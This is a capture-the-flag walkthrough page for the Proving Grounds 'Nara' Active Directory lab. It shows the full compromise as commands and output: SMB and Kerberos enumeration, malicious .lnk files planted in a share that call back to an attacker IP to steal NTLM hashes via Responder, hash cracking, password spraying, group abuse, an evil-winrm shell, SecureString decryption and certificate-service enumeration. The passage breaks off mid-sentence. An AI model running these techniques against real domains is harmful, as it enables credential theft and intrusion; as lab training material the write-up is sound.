<!DOCTYPE html>
<html lang="en" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=37131&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Nara || PG Practice | SecFortess</title>
<meta name="keywords" content="Active directory, Windows, Phishing">
<meta name="description" content="Solve a very hard community rated active directory machine from proving grounds practice">
<meta name="author" content="SecFortress">
<link rel="canonical" href="http://localhost:37131/hacking/nara/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css" integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:37131/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:37131/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:37131/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:37131/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:37131/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://localhost:37131/hacking/nara/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript>
  

<meta property="og:title" content="Nara || PG Practice" />
<meta property="og:description" content="Solve a very hard community rated active directory machine from proving grounds practice" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:37131/hacking/nara/" /><meta property="article:section" content="hacking" />

<meta property="og:site_name" content="SecFortress" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Nara || PG Practice"/>
<meta name="twitter:description" content="Solve a very hard community rated active directory machine from proving grounds practice"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Hackings",
      "item": "http://localhost:37131/hacking/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Nara || PG Practice",
      "item": "http://localhost:37131/hacking/nara/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Nara || PG Practice",
  "name": "Nara || PG Practice",
  "description": "Solve a very hard community rated active directory machine from proving grounds practice",
  "keywords": [
    "Active directory", "Windows", "Phishing"
  ],
  "articleBody": "Running an nmap scan we have :\n# Nmap 7.94SVN scan initiated Wed Aug 14 21:11:54 2024 as: nmap -p- -T4 -v --min-rate=1000 -sCV -oN nmap.txt -Pn 192.168.209.30 Increasing send delay for 192.168.209.30 from 0 to 5 due to 11 out of 21 dropped probes since last increase. Increasing send delay for 192.168.209.30 from 5 to 10 due to 11 out of 26 dropped probes since last increase. Nmap scan report for 192.168.209.30 Host is up (0.17s latency). Not shown: 65512 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-08-14 20:16:35Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: nara-security.com0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=Nara.nara-security.com | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::, DNS:Nara.nara-security.com | Issuer: commonName=NARA-CA | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2024-08-02T01:56:04 | Not valid after: 2025-08-02T01:56:04 | MD5: fbf8:e851:dddb:efe3:c9f0:4605:1d4c:8878 |_SHA-1: bfc8:975f:6219:267f:4112:bff5:d130:6cb4:e0d1:6fea |_ssl-date: TLS randomness does not represent time 445/tcp open microsoft-ds? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: nara-security.com0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=Nara.nara-security.com | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::, DNS:Nara.nara-security.com | Issuer: commonName=NARA-CA | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2024-08-02T01:56:04 | Not valid after: 2025-08-02T01:56:04 | MD5: fbf8:e851:dddb:efe3:c9f0:4605:1d4c:8878 |_SHA-1: bfc8:975f:6219:267f:4112:bff5:d130:6cb4:e0d1:6fea 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: nara-security.com0., Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=Nara.nara-security.com | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::, DNS:Nara.nara-security.com | Issuer: commonName=NARA-CA | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2024-08-02T01:56:04 | Not valid after: 2025-08-02T01:56:04 | MD5: fbf8:e851:dddb:efe3:c9f0:4605:1d4c:8878 |_SHA-1: bfc8:975f:6219:267f:4112:bff5:d130:6cb4:e0d1:6fea 3269/tcp open globalcatLDAPssl? | ssl-cert: Subject: commonName=Nara.nara-security.com | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::, DNS:Nara.nara-security.com | Issuer: commonName=NARA-CA | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2024-08-02T01:56:04 | Not valid after: 2025-08-02T01:56:04 | MD5: fbf8:e851:dddb:efe3:c9f0:4605:1d4c:8878 |_SHA-1: bfc8:975f:6219:267f:4112:bff5:d130:6cb4:e0d1:6fea 3389/tcp open ms-wbt-server Microsoft Terminal Services | ssl-cert: Subject: commonName=Nara.nara-security.com | Issuer: commonName=Nara.nara-security.com | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2024-05-06T12:45:53 | Not valid after: 2024-11-05T12:45:53 | MD5: 3653:d557:37ce:b6cc:64c8:ef5b:f664:bfaa |_SHA-1: 4641:1138:a700:92f6:64fd:8c8c:83b5:65e4:2f26:a24d |_ssl-date: 2024-08-14T20:18:59+00:00; 0s from scanner time. | rdp-ntlm-info: | Target_Name: NARASEC | NetBIOS_Domain_Name: NARASEC | NetBIOS_Computer_Name: NARA | DNS_Domain_Name: nara-security.com | DNS_Computer_Name: Nara.nara-security.com | DNS_Tree_Name: nara-security.com | Product_Version: 10.0.20348 |_ System_Time: 2024-08-14T20:17:45+00:00 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | http-methods: |_ Supported Methods: GET 9389/tcp open mc-nmf .NET Message Framing 49664/tcp open unknown 49667/tcp open unknown 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open unknown 49685/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49687/tcp open unknown 49696/tcp open unknown 49698/tcp open unknown 49715/tcp open unknown 49725/tcp open unknown Service Info: Host: NARA; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2024-08-14T20:17:43 |_ start_date: N/A Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Aug 14 21:19:20 2024 -- 1 IP address (1 host up) scanned in 446.05 seconds We can see that this is an active directory machine with domain name as ; “nara-security.com” with DC/Hostname as ; \"NARA\", It will be best adding this to your /etc/hosts file for domain resolution.\nWe can confirm this using netexec utility ❯ nxc smb 192.168.209.30 SMB 192.168.209.30 445 NARA [*] Windows Server 2022 Build 20348 x64 (name:NARA) (domain:nara-security.com) (signing:True) (SMBv1:False) SMB Enumeration ; There are literally no shares that a NULL user has access to except from the nara share ❯ smbclient -L \\\\\\\\192.168.209.30\\\\ Password for [WORKGROUP\\sec-fortress]: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC nara Disk company share NETLOGON Disk Logon server share SYSVOL Disk Logon server share tstream_smbXcli_np_destructor: cli_close failed on pipe srvsvc. Error was NT_STATUS_IO_TIMEOUT Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 192.168.209.30 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup available ========================================================================== ## In-accessible Shares ❯ smbclient \\\\\\\\192.168.209.30\\\\C$\\\\ Password for [WORKGROUP\\sec-fortress]: tree connect failed: NT_STATUS_ACCESS_DENIED ❯ smbclient \\\\\\\\192.168.209.30\\\\ADMIN$\\\\ Password for [WORKGROUP\\sec-fortress]: tree connect failed: NT_STATUS_ACCESS_DENIED ❯ smbclient \\\\\\\\192.168.209.30\\\\IPC$\\\\ Password for [WORKGROUP\\sec-fortress]: Try \"help\" to get a list of possible commands. smb: \\\u003e dir NT_STATUS_NO_SUCH_FILE listing \\* smb: \\\u003e put nmap.txt NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \\nmap.txt smb: \\\u003e exit ❯ smbclient \\\\\\\\192.168.209.30\\\\NETLOGON\\\\ Password for [WORKGROUP\\sec-fortress]: Try \"help\" to get a list of possible commands. smb: \\\u003e dir NT_STATUS_ACCESS_DENIED listing \\* smb: \\\u003e exit ❯ smbclient \\\\\\\\192.168.209.30\\\\SYSVOL\\\\ Password for [WORKGROUP\\sec-fortress]: Try \"help\" to get a list of possible commands. smb: \\\u003e dir NT_STATUS_ACCESS_DENIED listing \\* smb: \\\u003e exit ## Accessible Shares ❯ smbclient \\\\\\\\192.168.209.30\\\\nara\\\\ Password for [WORKGROUP\\sec-fortress]: Try \"help\" to get a list of possible commands. smb: \\\u003e dir . D 0 Sun Jul 30 15:31:58 2023 .. DHS 0 Wed Aug 14 20:53:15 2024 Documents D 0 Sun Jul 30 15:03:13 2023 Important.txt A 2200 Sun Jul 30 15:05:31 2023 IT D 0 Wed Aug 14 21:14:43 2024 7699711 blocks of size 4096. 3661536 blocks available smb: \\\u003e So i downloaded the Important.txt file in this share using the mget command and the content can be viewed as shown below ❯ \\cat Important.txt Dear Team, We hope this message finds you well. We wanted to remind all employees to take a moment each day to check the shared documents folder diligently. As part of our commitment to streamline processes and enhance efficiency, important documents are frequently uploaded to this folder for your attention and action. The shared documents folder serves as a central hub for crucial updates, contracts, agreements, and various other essential materials requiring your attention. To ensure that you don't miss any critical information, please make it a habit to access the folder at the beginning of your workday or as often as possible. Here are a few simple steps to stay up-to-date and ensure timely actions: * Access the Shared Documents Folder: Log in to your company account and navigate to the designated shared documents folder. If you encounter any issues accessing the folder, please reach out to the IT department for assistance. * Review New Additions: Look for any new documents that might have been uploaded since your last visit. These documents might require your signature, feedback, or acknowledgment. * Take Action Promptly: If there are documents that need your attention, please act promptly and follow the necessary procedures as indicated within each document. Whether it's a signature, a comment, or any other form of response, timely actions are vital to keep our operations running smoothly. * Seek Clarification: If you encounter any uncertainty or have questions about the documents you find, don't hesitate to reach out to the relevant department or the person mentioned in the document for clarification. It's essential that you fully understand what's required before proceeding. Remember, staying informed and acting promptly ensures that projects progress seamlessly, contracts get executed on time, and the company as a whole operates efficiently. Your cooperation in this matter is greatly appreciated and contributes to our collective success. Thank you for your attention to this matter, and if you have any concerns or suggestions to improve our document management process, please share them with your department head or the HR team. This text literally gave me the hint that we can actually place files in the nara share, You know what i am thinking ??……….NTLM Theft 😈.\nFirst of all i tried to enumerate users using the RID brute technique since we have READ access on the “Remote IPC” share. ❯ cme smb 192.168.209.30 -u guest -p \"\" --rid-brute | grep -i sidtypeuser | awk -F'\\' '{print $2}' | cut -d '(' -f1 \u003e\u003e users.txt ❯ \\cat users.txt Administrator Guest krbtgt NARA$ Amelia.O'Brien Damian.Johnson Helen.Robinson Sara.O'Sullivan Jasmine.Roberts Declan.Reynolds Jodie.Summers Carolyn.Hill Jemma.Humphries Tracy.White Then as usual tried to try usernames as password, I mean leaving no stone un-turned, This is Offsec 😭🤲. ❯ cme smb 192.168.209.30 -u users.txt -p users.txt --no-bruteforce --continue-on-success SMB 192.168.209.30 445 NARA [*] Windows 10.0 Build 20348 x64 (name:NARA) (domain:nara-security.com) (signing:True) (SMBv1:False) SMB 192.168.209.30 445 NARA [-] nara-security.com\\Administrator:Administrator STATUS_LOGON_FAILURE SMB 192.168.209.30 445 NARA [-] nara-security.com\\Guest:Guest STATUS_LOGON_FAILURE SMB 192.168.209.30 445 NARA [-] nara-security.com\\krbtgt:krbtgt STATUS_LOGON_FAILURE SMB 192.168.209.30 445 NARA [-] nara-security.com\\NARA$:NARA$ STATUS_LOGON_FAILURE SMB 192.168.209.30 445 NARA [-] nara-security.com\\Amelia.O'Brien:Amelia.O'Brien STATUS_LOGON_FAILURE SMB 192.168.209.30 445 NARA [-] nara-security.com\\Damian.Johnson:Damian.Johnson STATUS_LOGON_FAILURE SMB 192.168.209.30 445 NARA [-] nara-security.com\\Helen.Robinson:Helen.Robinson STATUS_LOGON_FAILURE SMB 192.168.209.30 445 NARA [-] nara-security.com\\Sara.O'Sullivan:Sara.O'Sullivan STATUS_LOGON_FAILURE SMB 192.168.209.30 445 NARA [-] nara-security.com\\Jasmine.Roberts:Jasmine.Roberts STATUS_LOGON_FAILURE SMB 192.168.209.30 445 NARA [-] nara-security.com\\Declan.Reynolds:Declan.Reynolds STATUS_LOGON_FAILURE SMB 192.168.209.30 445 NARA [-] nara-security.com\\Jodie.Summers:Jodie.Summers STATUS_LOGON_FAILURE SMB 192.168.209.30 445 NARA [-] nara-security.com\\Carolyn.Hill:Carolyn.Hill STATUS_LOGON_FAILURE SMB 192.168.209.30 445 NARA [-] nara-security.com\\Jemma.Humphries:Jemma.Humphries STATUS_LOGON_FAILURE SMB 192.168.209.30 445 NARA [-] nara-security.com\\Tracy.White:Tracy.White STATUS_LOGON_FAILURE That didn’t turn out as expected so the next thing on my list is the ASREPRoasting attack which should be possible to get any user hash due to Kerberos pre-authentication required attribute enabled on an object. ❯ impacket-GetNPUsers nara-security.com/ -dc-ip 192.168.209.30 -usersfile users.txt -format hashcat -outputfile hashes.txt Impacket v0.12.0.dev1 - Copyright 2023 Fortra [-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] User NARA$ doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User Amelia.O'Brien doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User Damian.Johnson doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User Helen.Robinson doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User Sara.O'Sullivan doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User Jasmine.Roberts doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User Declan.Reynolds doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User Jodie.Summers doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User Carolyn.Hill doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User Jemma.Humphries doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User Tracy.White doesn't have UF_DONT_REQUIRE_PREAUTH set The last technique also didn’t yield result as expected so i decided to run my kerbrute and enumerate users again just to be sure i am on the right path. But hehe, No users where discovered except from the Administrator and Guest user account which is as usual. ❯ kerbrute userenum --dc 192.168.209.30 --domain nara-security.com /usr/share/wordlists/seclist/Usernames/xato-net-10-million-usernames.txt __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,\u003c / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: v1.0.1 (385cb2b) - 08/14/24 - Ronnie Flathers @ropnop 2024/08/14 21:35:26 \u003e Using KDC(s): 2024/08/14 21:35:26 \u003e 192.168.209.30:88 2024/08/14 21:38:50 \u003e [+] VALID USERNAME: guest@nara-security.com 2024/08/14 21:55:53 \u003e [+] VALID USERNAME: administrator@nara-security.com 2024/08/14 23:13:00 \u003e Done! Tested 8295455 usernames (2 valid) in 5854.516 seconds Moving on to the NTLM Theft technique i decided to use the ntlm_theft tool from Green Wolf to exploit this by generating a malicious .LNK file that will get executed by the automated user in that share and then return their hashes. ( That is if there is any, but let try :] ) ❯ python3 ntlm_theft.py -g all -s 192.168.45.235 -f test Created: test/test.scf (BROWSE TO FOLDER) Created: test/test-(url).url (BROWSE TO FOLDER) Created: test/test-(icon).url (BROWSE TO FOLDER) Created: test/test.lnk (BROWSE TO FOLDER) Created: test/test.rtf (OPEN) Created: test/test-(stylesheet).xml (OPEN) Created: test/test-(fulldocx).xml (OPEN) Created: test/test.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE) Created: test/test-(includepicture).docx (OPEN) Created: test/test-(remotetemplate).docx (OPEN) Created: test/test-(frameset).docx (OPEN) Created: test/test-(externalcell).xlsx (OPEN) Created: test/test.wax (OPEN) Created: test/test.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY) Created: test/test.asx (OPEN) Created: test/test.jnlp (OPEN) Created: test/test.application (DOWNLOAD AND OPEN) Created: test/test.pdf (OPEN AND ALLOW) Created: test/zoom-attack-instructions.txt (PASTE TO CHAT) Created: test/Autorun.inf (BROWSE TO FOLDER) Created: test/desktop.ini (BROWSE TO FOLDER) Generation Complete. After generating i uploaded the test.lnk file to each directory in the share cos i don’t know where the automation is taking place ☹️. ❯ smbclient \\\\\\\\192.168.165.30\\\\nara\\\\ Password for [WORKGROUP\\sec-fortress]: Try \"help\" to get a list of possible commands. smb: \\\u003e put test.lnk putting file test.lnk as \\test.lnk (0.7 kb/s) (average 0.7 kb/s) smb: \\\u003e cd IT smb: \\IT\\\u003e put test.lnk putting file test.lnk as \\IT\\test.lnk (1.5 kb/s) (average 0.9 kb/s) smb: \\IT\\\u003e cd ..\\ smb: \\\u003e cd Documents\\ smb: \\Documents\\\u003e put test.lnk putting file test.lnk as \\Documents\\test.lnk (4.3 kb/s) (average 1.3 kb/s) smb: \\Documents\\\u003e Then started up responder and hell yeah i got user Tracy.White hash which we discovered earlier. ❯ sudo responder -I tun0 __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| NBT-NS, LLMNR \u0026 MDNS Responder 3.1.4.0 To support this project: Github -\u003e https://github.com/sponsors/lgandx Paypal -\u003e https://paypal.me/PythonResponder Author: Laurent Gaffie (laurent.gaffie@gmail.com) To kill this script hit CTRL-C [+] Poisoners: LLMNR [ON] NBT-NS [ON] MDNS [ON] DNS [ON] --SNIP-- [+] Listening for events... [SMB] NTLMv2-SSP Client : 192.168.165.30 [SMB] NTLMv2-SSP Username : NARASEC\\Tracy.White [SMB] NTLMv2-SSP Hash : Tracy.White::NARASEC:9bbf8934331a4560:7E3E7EB81FF46C2022052D262FF86FED:0101000000000000804E1194E3EEDA012C0D0C83CBDD665900000000020008004F0031003400450001001E00570 049004E002D004300420041003200580050004B00420052005500300004003400570049004E002D004300420041003200580050004B0042005200550030002E004F003100340045002E004C004F00430041004C00030014004F00310034004 5002E004C004F00430041004C00050014004F003100340045002E004C004F00430041004C0007000800804E1194E3EEDA0106000400020000000800300030000000000000000100000000200000452F70F2B66A34630BD52340E899C3B9A07 2F2D5A53D205FCBB235EA806B7FB60A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200330035000000000000000000 [*] Skipping previously captured hash for NARASEC\\Tracy.White [*] Skipping previously captured hash for NARASEC\\Tracy.White [*] Skipping previously captured hash for NARASEC\\Tracy.White [*] Skipping previously captured hash for NARASEC\\Tracy.White [*] Skipping previously captured hash for NARASEC\\Tracy.White [+] Exiting... [*] Skipping previously captured hash for NARASEC\\Tracy.White You can also use the Hashgrab tool by XCT to generate the .LNK file, haven’t tried it before but it is worth the try at least.\nEZPZ, Cracked this user hash and got the password with JtR ❯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64]) Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status zqwj041FGX (Tracy.White) 1g 0:00:00:01 DONE (2024-08-15 07:25) 0.7874g/s 1954Kp/s 1954Kc/s 1954KC/s zta729..zozorox92 Use the \"--show --format=netntlmv2\" options to display all of the cracked passwords reliably Session completed. The goal is to always password spray, I mean on a CTF not real world engagement 🤣🥹, and see if there are any other users using that same password. Unfortunately, Only the user Tracy.White which we have acquired uses that credential. ❯ cme smb 192.168.165.30 -u users.txt -p \"zqwj041FGX\" --continue-on-success SMB 192.168.165.30 445 NARA [*] Windows 10.0 Build 20348 x64 (name:NARA) (domain:nara-security.com) (signing:True) (SMBv1:False) SMB 192.168.165.30 445 NARA [-] nara-security.com\\Administrator:zqwj041FGX STATUS_LOGON_FAILURE SMB 192.168.165.30 445 NARA [-] nara-security.com\\Guest:zqwj041FGX STATUS_LOGON_FAILURE SMB 192.168.165.30 445 NARA [-] nara-security.com\\krbtgt:zqwj041FGX STATUS_LOGON_FAILURE SMB 192.168.165.30 445 NARA [-] nara-security.com\\NARA$:zqwj041FGX STATUS_LOGON_FAILURE SMB 192.168.165.30 445 NARA [-] nara-security.com\\Amelia.O'Brien:zqwj041FGX STATUS_LOGON_FAILURE SMB 192.168.165.30 445 NARA [-] nara-security.com\\Damian.Johnson:zqwj041FGX STATUS_LOGON_FAILURE SMB 192.168.165.30 445 NARA [-] nara-security.com\\Helen.Robinson:zqwj041FGX STATUS_LOGON_FAILURE SMB 192.168.165.30 445 NARA [-] nara-security.com\\Sara.O'Sullivan:zqwj041FGX STATUS_LOGON_FAILURE SMB 192.168.165.30 445 NARA [-] nara-security.com\\Jasmine.Roberts:zqwj041FGX STATUS_LOGON_FAILURE SMB 192.168.165.30 445 NARA [-] nara-security.com\\Declan.Reynolds:zqwj041FGX STATUS_LOGON_FAILURE SMB 192.168.165.30 445 NARA [-] nara-security.com\\Jodie.Summers:zqwj041FGX STATUS_LOGON_FAILURE SMB 192.168.165.30 445 NARA [-] nara-security.com\\Carolyn.Hill:zqwj041FGX STATUS_LOGON_FAILURE SMB 192.168.165.30 445 NARA [-] nara-security.com\\Jemma.Humphries:zqwj041FGX STATUS_LOGON_FAILURE SMB 192.168.165.30 445 NARA [+] nara-security.com\\Tracy.White:zqwj041FGX The rule of thumb for me is always to load up bloodhound once i have valid credentials. So i use the bloodhound-python tool which uses LDAP to query domain information if you have valid set of credentials. You don’t have to wait till you get foothold so you can run a SharpHound collector, Hell NO!!!!!!. ❯ bloodhound-python -u 'Tracy.White' -p 'zqwj041FGX' -ns 192.168.165.30 -d nara-security.com -c all --zip --dns-timeout 50 INFO: Found AD domain: nara-security.com INFO: Getting TGT for user WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (nara.nara-security.com:88)] [Errno -2] Name or service not known INFO: Connecting to LDAP server: nara.nara-security.com INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 1 computers INFO: Connecting to LDAP server: nara.nara-security.com INFO: Found 14 users INFO: Found 55 groups INFO: Found 2 gpos INFO: Found 3 ous INFO: Found 19 containers INFO: Found 0 trusts INFO: Starting computer enumeration with 10 workers INFO: Querying computer: Nara.nara-security.com INFO: Done in 02M 48S INFO: Compressing output into 20240815073121_bloodhound.zip Then uploaded the loot to bloodhound GUI and has shown below our user Tracy.White has GenericAll ACE to the “Remote Access” group. At least we would now be able to connect via WinRM or RDP by adding our self to this groups respectively. We can carry out this operation by doing so, using the net tool on kali to add our self to the group and checking if this operation was successful. # Add to group ❯ net rpc group addmem \"REMOTE ACCESS\" \"Tracy.White\" -U \"nara-security.com\"/\"Tracy.White\"%\"zqwj041FGX\" -S 192.168.165.30 # Confirm operation was successful ❯ net rpc group members \"REMOTE ACCESS\" -U \"nara-security.com\"/\"Tracy.White\"%\"zqwj041FGX\" -S 192.168.165.30 NARASEC\\Jodie.Summers NARASEC\\Tracy.White We can then try to authenticate via WinRM using CrackMapExec and see if we truly have access \u003c#. Yes we do! ❯ cme winrm 192.168.165.30 -u Tracy.White -p zqwj041FGX SMB 192.168.165.30 5985 NARA [*] Windows 10.0 Build 20348 (name:NARA) (domain:nara-security.com) HTTP 192.168.165.30 5985 NARA [*] http://192.168.165.30:5985/wsman HTTP 192.168.165.30 5985 NARA [+] nara-security.com\\Tracy.White:zqwj041FGX (Pwn3d!) So go ahead and login using the evil-winrm utility as user Tracy.White which should be successful. ❯ evil-winrm -i 192.168.165.30 -u Tracy.White -p zqwj041FGX Evil-WinRM shell v3.5 --SNIP-- Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\tracy.white\\Documents\u003e whoami narasec\\tracy.white Now we have to load Post-Exploitation tools like WinPEAS, Snaffler, LaZagne, MimiKatz etc to see what we have. However majority of this tools where blocked by AV so i started manual enumeration and found this automation.txt file. *Evil-WinRM* PS C:\\Users\\tracy.white\\Documents\u003e dir Directory: C:\\Users\\tracy.white\\Documents Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 7/30/2023 8:05 AM 373 automation.txt The content looked like a powershell secure string which is used to help protect confidential text. *Evil-WinRM* PS C:\\Users\\tracy.white\\Documents\u003e type automation.txt Enrollment Automation Account 01000000d08c9ddf0115d1118c7a00c04fc297eb0100000001e86ea0aa8c1e44ab231fbc46887c3a0000000002000000000003660000c000000010000000fc73b7bdae90b8b2526ada95774376ea0000000004800000a000000010000000b7a07aa1e5dc859485070026f64dc7a720000000b428e697d96a87698d170c47cd2fc676bdbd639d2503f9b8c46dfc3df4863a4314000000800204e38291e91f37bd84a3ddb0d6f97f9eea2b To decrypt this we can replicate the following steps *Evil-WinRM* PS C:\\Users\\tracy.white\\Documents\u003e $user = \"Enrollment Automation Account\" # Not necessary a valid user if you don't have one *Evil-WinRM* PS C:\\Users\\tracy.white\\Documents\u003e $pass = \"01000000d08c9ddf0115d1118c7a00c04fc297eb0100000001e86ea0aa8c1e44ab231fbc46887c3a0000000002000000000003660000c000000010000000fc73b7bdae90b8b2526ada95774376ea0000000004800000a000000010000000b7a07aa1e5dc859485070026f64dc7a720000000b428e697d96a87698d170c47cd2fc676bdbd639d2503f9b8c46dfc3df4863a4314000000800204e38291e91f37bd84a3ddb0d6f97f9eea2b\" | ConvertTo-SecureString *Evil-WinRM* PS C:\\Users\\tracy.white\\Documents\u003e $cred = New-Object System.Management.Automation.PSCredential($user, $pass) *Evil-WinRM* PS C:\\Users\\tracy.white\\Documents\u003e $cred.GetNetworkCredential() | fl UserName : Enrollment Automation Account Password : hHO_S9gff7ehXw SecurePassword : System.Security.SecureString Domain : Now that we have the clear text password but don’t know which account uses this password, we can go ahead and password spray and as shown below we got a hit on user Jodie.Summers ❯ cme smb 192.168.220.30 -u users.txt -p hHO_S9gff7ehXw SMB 192.168.220.30 445 NARA [*] Windows 10.0 Build 20348 x64 (name:NARA) (domain:nara-security.com) (signing:True) (SMBv1:False) SMB 192.168.220.30 445 NARA [-] nara-security.com\\Administrator:hHO_S9gff7ehXw STATUS_LOGON_FAILURE SMB 192.168.220.30 445 NARA [-] nara-security.com\\Guest:hHO_S9gff7ehXw STATUS_LOGON_FAILURE SMB 192.168.220.30 445 NARA [-] nara-security.com\\krbtgt:hHO_S9gff7ehXw STATUS_LOGON_FAILURE SMB 192.168.220.30 445 NARA [-] nara-security.com\\NARA$:hHO_S9gff7ehXw STATUS_LOGON_FAILURE SMB 192.168.220.30 445 NARA [-] nara-security.com\\Amelia.O'Brien:hHO_S9gff7ehXw STATUS_LOGON_FAILURE SMB 192.168.220.30 445 NARA [-] nara-security.com\\Damian.Johnson:hHO_S9gff7ehXw STATUS_LOGON_FAILURE SMB 192.168.220.30 445 NARA [-] nara-security.com\\Helen.Robinson:hHO_S9gff7ehXw STATUS_LOGON_FAILURE SMB 192.168.220.30 445 NARA [-] nara-security.com\\Sara.O'Sullivan:hHO_S9gff7ehXw STATUS_LOGON_FAILURE SMB 192.168.220.30 445 NARA [-] nara-security.com\\Jasmine.Roberts:hHO_S9gff7ehXw STATUS_LOGON_FAILURE SMB 192.168.220.30 445 NARA [-] nara-security.com\\Declan.Reynolds:hHO_S9gff7ehXw STATUS_LOGON_FAILURE SMB 192.168.220.30 445 NARA [+] nara-security.com\\Jodie.Summers:hHO_S9gff7ehXw I don’t know what made me think about ADCS attacks but the “Enrollment Automation Account” already gave it away i think. so i decided to enumerate vulnerable certificates using the certipy tool. ❯ certipy find -vulnerable -dc-ip 192.168.220.30 -u 'Jodie.Summers@nara-security.com' -p 'hHO_S9gff7ehXw' Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Finding certificate templates [*] Found 34 certificate templates [*] Finding certificate authorities [*] Found 1 certificate authority [*] Found 12 enabled certificate templates [*] Trying to get CA configuration for 'NARA-CA' via CSRA [!] Got error while trying to get CA configuration for 'NARA-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error. [*] Trying to get CA configuration for 'NARA-CA' via RRP [!] Failed to connect to remote registry. Service should be starting now. Trying again... [*] Got CA configuration for 'NARA-CA' [*] Saved BloodHound data to '20240816092801_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k [*] Saved text output to 